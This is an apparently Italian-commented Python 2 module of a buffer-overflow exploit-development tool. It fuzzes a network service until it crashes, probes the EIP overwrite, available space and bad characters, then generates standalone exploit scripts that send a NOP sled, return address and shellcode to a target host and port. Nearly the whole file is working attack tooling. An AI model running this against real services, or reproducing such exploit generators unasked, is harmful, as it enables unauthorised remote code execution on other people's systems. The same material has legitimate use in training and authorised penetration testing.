# -*- coding: utf-8 -*-

import traceback
import time
import json
import re

# - - - - - - - - - - - - - - - - - - - - - - - - 
from lib_socket import *
from lib_primitive import *
# - - - - - - - - - - - - - - - - - - - - - - - - 



# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


def simple_fuzzer (socket, config, steps, max_length=10000):
	# socket:		oggetto socket
	# config:		dict di configurazione attacco
	# steps:		step incrementali
	# max_length:	grandezza massima payload (predefinita 10000)

	char = "\x41"		# Char "A" per test
	c = steps			# Numero di caratteri da inviare
	send_status = 0 	# Inizializzato a -1 in caso di porta chiusa
	cycled = False		# Verifica il loop

	server_status = socket.check_port ()

	while (server_status == 0) and (send_status == 0) and (c <= max_length):
		print "[i] Sending " + str(c) + " chars at " + str(config['addr']) + ":" + str(config['port'])
		cycled = True
		payload = (char * c)
		send_status = socket.run_protocol_exploit(config, payload)
		server_status = socket.check_port ()
		c += steps
		time.sleep(1)			# Attesa fra una richiesta e l'altra

	server_status = socket.check_port ()

	if (cycled) and (server_status != 0) or (send_status != 0):
		return c - steps 											# E' crashato, rimuovo l'ultimo incremento

	if (cycled) and (server_status == 0) and (send_status == 0):
		return -1													# Non Ã¨ crashato
		
	else:
		return -2


# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


def eip_check (socket, config, offset):
	# socket:		oggetto socket
	# config:		dict di configurazione attacco
	# offset:		grandezza dell'offset

	char = "\x41"				# Char "A" per overflow
	eip_char = "\x42" * 4		# Char "B" per test EIP

	server_status = socket.check_port ()
	if (server_status == 0):
		payload = (char * offset) + eip_char
		return socket.run_protocol_exploit(config, payload)

	else:
		return -1


def space_check (socket, config, offset):
	# socket:		oggetto socket
	# config:		dict di configurazione attacco
	# offset:		grandezza dell'offset

	char = "\x41"				# Char "A" per overflow
	eip_char = "\x42" * 4		# Char "B" per test EIP
	space = "\x43" * 2000		# Char "C" per test spazio

	server_status = socket.check_port ()
	if (server_status == 0):
		payload = (char * offset) + eip_char + space
		return socket.run_protocol_exploit(config, payload)

	else:
		return -1


# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


def send_badchar (socket, config, offset, ex_chars, space, preeip):
	# socket:		oggetto socket
	# config:		dict di configurazione attacco
	# offset:		grandezza dell'offset
	# ex_chars:		caratteri esclusi (deve essere un array di char da escludere)
	# space:		spazio disponibile dopo indirizzo EIP (non utilizzato)
	# preeip:		stabilisce se i badchar vanno inviari prima dell'eip

	try:
		badchar_arr = [
			"\x00", "\x01", "\x02", "\x03", "\x04", "\x05", "\x06", "\x07", "\x08", "\x09", "\x0a", 
			"\x0b", "\x0c", "\x0d", "\x0e", "\x0f", "\x10", "\x11", "\x12", "\x13", "\x14", "\x15", 
			"\x16", "\x17", "\x18", "\x19", "\x1a", "\x1b", "\x1c", "\x1d", "\x1e", "\x1f", "\x20", 
			"\x21", "\x22", "\x23", "\x24", "\x25", "\x26", "\x27", "\x28", "\x29", "\x2a", "\x2b", 
			"\x2c", "\x2d", "\x2e", "\x2f", "\x30", "\x31", "\x32", "\x33", "\x34", "\x35", "\x36", 
			"\x37", "\x38", "\x39", "\x3a", "\x3b", "\x3c", "\x3d", "\x3e", "\x3f", "\x40", "\x41", 
			"\x42", "\x43", "\x44", "\x45", "\x46", "\x47", "\x48", "\x49", "\x4a", "\x4b", "\x4c", 
			"\x4d", "\x4e", "\x4f", "\x50", "\x51", "\x52", "\x53", "\x54", "\x55", "\x56", "\x57", 
			"\x58", "\x59", "\x5a", "\x5b", "\x5c", "\x5d", "\x5e", "\x5f", "\x60", "\x61", "\x62", 
			"\x63", "\x64", "\x65", "\x66", "\x67", "\x68", "\x69", "\x6a", "\x6b", "\x6c", "\x6d", 
			"\x6e", "\x6f", "\x70", "\x71", "\x72", "\x73", "\x74", "\x75", "\x76", "\x77", "\x78", 
			"\x79", "\x7a", "\x7b", "\x7c", "\x7d", "\x7e", "\x7f", "\x80", "\x81", "\x82", "\x83", 
			"\x84", "\x85", "\x86", "\x87", "\x88", "\x89", "\x8a", "\x8b", "\x8c", "\x8d", "\x8e", 
			"\x8f", "\x90", "\x91", "\x92", "\x93", "\x94", "\x95", "\x96", "\x97", "\x98", "\x99", 
			"\x9a", "\x9b", "\x9c", "\x9d", "\x9e", "\x9f", "\xa0", "\xa1", "\xa2", "\xa3", "\xa4", 
			"\xa5", "\xa6", "\xa7", "\xa8", "\xa9", "\xaa", "\xab", "\xac", "\xad", "\xae", "\xaf", 
			"\xb0", "\xb1", "\xb2", "\xb3", "\xb4", "\xb5", "\xb6", "\xb7", "\xb8", "\xb9", "\xba", 
			"\xbb", "\xbc", "\xbd", "\xbe", "\xbf", "\xc0", "\xc1", "\xc2", "\xc3", "\xc4", "\xc5", 
			"\xc6", "\xc7", "\xc8", "\xc9", "\xca", "\xcb", "\xcc", "\xcd", "\xce", "\xcf", "\xd0", 
			"\xd1", "\xd2", "\xd3", "\xd4", "\xd5", "\xd6", "\xd7", "\xd8", "\xd9", "\xda", "\xdb", 
			"\xdc", "\xdd", "\xde", "\xdf", "\xe0", "\xe1", "\xe2", "\xe3", "\xe4", "\xe5", "\xe6", 
			"\xe7", "\xe8", "\xe9", "\xea", "\xeb", "\xec", "\xed", "\xee", "\xef", "\xf0", "\xf1", 
			"\xf2", "\xf3", "\xf4", "\xf5", "\xf6", "\xf7", "\xf8", "\xf9", "\xfa", "\xfb", "\xfc", 
			"\xfd", "\xfe", "\xff"
		]

		for c in ex_chars:				# Rimuovo i badchar
			badchar_arr.remove(c.decode('hex'))


		char = "\x41"												# Char "A" per overflow
		eip_char = "\x42" * 4										# Char "B" per test EIP
		extra = "\x43" * 4											# Char "C" per extra (dopo EIP)
		badchar_string = ''.join([str(x) for x in badchar_arr]) 	# Converto badchar_arr in unica stringa

		#print badchar_string.encode('hex')

		server_status = socket.check_port ()
		if (server_status == 0):
			payload = ""
			if (preeip):	payload = char * (offset - len(badchar_string)) + badchar_string + eip_char + extra
			else: 			payload = char * (offset) + eip_char + badchar_string + extra
			return socket.run_protocol_exploit(config, payload)
		else:
			return -1

	except Exception, e:
		traceback.print_exc(e)
		return -3



def build_poc (config, SESSION, filename, nnops=16):
	# config:		dict di configurazione attacco
	# SESSION:		dict di sessione
	# filename:		nome del file dell'exploit
	# nnops:		il numero di nops da inserire

	try:
		str_buffer_apprx_length = ""
		str_buffer_length = ""
		str_eip_value = ""
		str_badchar = ""
		
		str_shellcode = ""
		sliced_shellcode = ""

		str_addr = '"' + str(config ['addr']) + '"'
		str_port = str(config ['port'])

		str_lbytes = '"' + str_pythonic_escape(config ['lbytes']) + '"'
		str_rbytes = '"' + str_pythonic_escape(config ['rbytes']) + '"'

		str_buffer_length = ""
		str_space = ""

		str_return_address = ""

		out = '#!/usr/bin/env python\n#-*- coding: utf-8 -*-\n\nimport socket\n\n'

		if SESSION ['raw_fuzzing']['buffer_apprx_length'] != None:
			str_buffer_apprx_length = str(SESSION ['raw_fuzzing']['buffer_apprx_length'])
			out += '# RAW FUZZING OFFSET:\tbuffer_apprx_length = ' + str_buffer_apprx_length + '\n'

		if SESSION ['precise_fuzzing']['buffer_length'] != None:
			str_buffer_length = str(SESSION ['precise_fuzzing']['buffer_length'])
			out += '# PRECISE FUZZING:\tbuffer_length = ' + str_buffer_length + '\n'

		if SESSION ['precise_fuzzing']['eip_value'] != None:
			str_eip_value = '"' + hex_escape(SESSION ['precise_fuzzing']['eip_value']) + '"'
			out += '# PRECISE FUZZING:\teip_value = ' + str_eip_value + '\n'

		if SESSION ['space_check']['space'] != None:
			str_space = str(SESSION ['space_check']['space'])

		if SESSION ['find_badchar']['badchar'] != None:
			str_badchar = str('\"\\x' if len(SESSION ['find_badchar']['badchar']) > 0 else '') + str('", "\\x'.join([str(x) for x in SESSION ['find_badchar']['badchar']])) + str('\"' if len(SESSION ['find_badchar']['badchar']) > 0 else '')
			out += '# BADCHAR Trovati:\tbadchar = [' + str_badchar + ']\n'

		if SESSION ['find_return_address']['return_address'] != None:
			str_return_address = '"' + hex_escape(SESSION ['find_return_address']['return_address']) + '"'


		out += '\n\n'


		if SESSION ['shellcode']['shellcode'] != None:
			str_shellcode = 'shellcode = ""'
			sliced_shellcode = re.findall('.{1,16}', SESSION ['shellcode']['shellcode'].decode('hex'))
			for e in sliced_shellcode:
				str_shellcode += '\nshellcode += "' + hex_escape(e.encode('hex')) + '"'

			out += str_shellcode + '\n\n\n'


		out += 'nop = "\\x90"\noffset = "\\x41"\nfill = "\\x43"\n\n'
		out += 'target_addr = ' + str_addr + '\ntarget_port = ' + str_port + '\n\n'
		out += 'lbytes = ' + str_lbytes + '\nrbytes = ' + str_rbytes + '\n\n'

			
		if SESSION ['precise_fuzzing']['buffer_length'] != None:
			out += 'buffer_length = ' + str_buffer_length + '\n'

		if SESSION ['space_check']['space'] != None:
			out += 'extra_space = ' + str_space + '\n\n'

		if SESSION ['find_return_address']['return_address'] != None:
			out += 'return_address = ' + str_return_address + '\n\n'

		
		out += '\n\n'


		if (	
			SESSION ['raw_fuzzing']['buffer_apprx_length'] != None and 
			SESSION ['precise_fuzzing']['buffer_length'] == None and
			SESSION ['space_check']['space'] == None and
			SESSION ['shellcode']['shellcode'] == None and
			SESSION ['find_return_address']['return_address'] == None
		): 
			out += 'buffer_apprx_length = ' + str_buffer_apprx_length + '\n\n\n'
			out += '#payload = lbytes + "' + pattern_create(SESSION ['raw_fuzzing']['buffer_apprx_length']) + '" + rbytes' + '\n'
			out += 'payload = lbytes + (offset * buffer_apprx_length) + rbytes' + '\n'


		elif (	
			SESSION ['raw_fuzzing']['buffer_apprx_length'] != None and 
			SESSION ['precise_fuzzing']['buffer_length'] != None and
			SESSION ['space_check']['space'] == None and
			SESSION ['shellcode']['shellcode'] == None and
			SESSION ['find_return_address']['return_address'] == None
		): 
			out += 'buffer_apprx_length = ' + str_buffer_apprx_length + '\n'
			out += 'eip_overwrite = "\\x42"\n\n\n'
			out += 'payload = lbytes + (offset * buffer_length) + (eip_overwrite * 4) + (fill * (buffer_apprx_length - (buffer_length + 4)) ) + rbytes' + '\n'


		elif (	
			SESSION ['raw_fuzzing']['buffer_apprx_length'] != None and 
			SESSION ['precise_fuzzing']['buffer_length'] != None and
			SESSION ['space_check']['space'] != None and
			SESSION ['shellcode']['shellcode'] == None and
			SESSION ['find_return_address']['return_address'] == None
		): 
			badchar_str = ""
			for x in range(0,256):
				badchar_str += ("\\x" + '{:02x}'.format(x))

			out += 'eip_overwrite = "\\x42"\n'
			out += 'badchar_string = "' + str(badchar_str) + '"' + '\n\n\n'
			
			out += '#payload = lbytes + (offset * buffer_length) + (eip_overwrite * 4) + badchar_string + (fill * (extra_space - len(badchar_string))) + rbytes' + '\n'
			out += 'payload = lbytes + (offset * buffer_length) + (eip_overwrite * 4) + (fill * extra_space) + rbytes' + '\n'


		elif (	
			SESSION ['raw_fuzzing']['buffer_apprx_length'] != None and 
			SESSION ['precise_fuzzing']['buffer_length'] != None and
			SESSION ['space_check']['space'] != None and
			SESSION ['shellcode']['shellcode'] != None and
			SESSION ['find_return_address']['return_address'] == None
		):
			out += 'eip_overwrite = "\\x42"' + '\n\n\n'
			out += 'payload = lbytes + (offset * buffer_length) + (eip_overwrite * 4) + (nop * ' + str(nnops) + ') + shellcode + (fill * (extra_space - ' + str(nnops) + ' - len(shellcode))) + rbytes' + '\n'


		elif (	
			SESSION ['raw_fuzzing']['buffer_apprx_length'] != None and 
			SESSION ['precise_fuzzing']['buffer_length'] != None and
			SESSION ['space_check']['space'] != None and
			SESSION ['shellcode']['shellcode'] != None and
			SESSION ['find_return_address']['return_address'] != None
		):
			out += 'payload = lbytes + (offset * buffer_length) + return_address + (nop * ' + str(nnops) + ') + shellcode + (fill * (extra_space - ' + str(nnops) + ' - len(shellcode))) + rbytes' + '\n'

		else:
			return -1

			

		out += '''\n\nprint "[i] Sending " + str(len(payload)) + " bytes of payload..."
ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#ss.settimeout(0)
ss.connect((target_addr, target_port))
		'''

		for e in config['protocol']:
			if (e['action'] == 'recv'):
				out += '\nss.recv(' + str(e['length']) + ')'

			elif (e['action'] == 'send'):
				out += '\nss.send(\'' + str(e['payload'].encode('unicode_escape')) + '\')'

			elif (e['action'] == 'exploit'):
				out += '\nss.send(payload)'

		out += '\nss.close()\nprint "[*] Exploit successful."'

		f = open(filename, "w")
		f.write(out)
		f.close ()

		return 0

	except Exception, e:
		traceback.print_exc(e)
		return -3


def build_exploit (config, SESSION, filename, nnops=16):
	# config:		dict di configurazione attacco
	# SESSION:		dict di sessione
	# filename:		nome del file dell'exploit
	# nnops:		il numero di nops da inserire

	try:
		str_buffer_apprx_length = str(SESSION ['raw_fuzzing']['buffer_apprx_length'])
		str_buffer_length = str(SESSION ['precise_fuzzing']['buffer_length'])
		str_eip_value = '"' + hex_escape(SESSION ['precise_fuzzing']['eip_value']) + '"'
		str_badchar = str('\"\\x' if len(SESSION ['find_badchar']['badchar']) > 0 else '') + str('", "\\x'.join([str(x) for x in SESSION ['find_badchar']['badchar']])) + str('\"' if len(SESSION ['find_badchar']['badchar']) > 0 else '')
		

		str_shellcode = 'shellcode = ""'
		sliced_shellcode = re.findall('.{1,16}', SESSION ['shellcode']['shellcode'].decode('hex'))
		for e in sliced_shellcode:
			str_shellcode += '\nshellcode += "' + hex_escape(e.encode('hex')) + '"'


		str_addr = '"' + str(config ['addr']) + '"'
		str_port = str(config ['port'])

		str_lbytes = '"' + str_pythonic_escape(config ['lbytes']) + '"'
		str_rbytes = '"' + str_pythonic_escape(config ['rbytes']) + '"'

		str_buffer_length = str(SESSION ['precise_fuzzing']['buffer_length'])
		str_space = str(SESSION ['space_check']['space'])

		str_return_address = '"' + hex_escape(SESSION ['find_return_address']['return_address']) + '"'



		out = '''#!/usr/bin/env python
#-*- coding: utf-8 -*-

import socket

# RAW FUZZING OFFSET:\tbuffer_apprx_length = ''' + str_buffer_apprx_length + '''
# PRECISE FUZZING:\tbuffer_length = ''' + str_buffer_length + '''
# PRECISE FUZZING:\teip_value = ''' + str_eip_value + '''
# BADCHAR Trovati:\tbadchar = [''' + str_badchar + ''']


''' + str_shellcode + '''


nop = "\\x90"
offset = "\\x41"
fill = "\\x43"

target_addr = ''' + str_addr + '''
target_port = ''' + str_port + '''

lbytes = ''' + str_lbytes + '''
rbytes = ''' + str_rbytes + '''

buffer_length = ''' + str_buffer_length + '''
extra_space = ''' + str_space + '''

return_address = ''' + str_return_address + '''

payload = lbytes + (offset * buffer_length) + return_address + (nop * ''' + str(nnops) + ''') + shellcode + (fill * (extra_space - ''' + str(nnops) + ''' - len(shellcode))) + rbytes

print "[i] Sending " + str(len(payload)) + " bytes of payload..."
ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#ss.settimeout(0)
ss.connect((target_addr, target_port))
'''

		for e in config['protocol']:
			if (e['action'] == 'recv'):
				out += '\nss.recv(' + str(e['length']) + ')'

			elif (e['action'] == 'send'):
				out += '\nss.send(\'' + str(e['payload'].encode('unicode_escape')) + '\')'

			elif (e['action'] == 'exploit'):
				out += '\nss.send(payload)'

		out += '\nss.close()\nprint "[*] Exploit successful."'

		f = open(filename, "w")
		f.write(out)
		f.close ()

		return 0

	except Exception, e:
		traceback.print_exc(e)
		return -3

		
# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
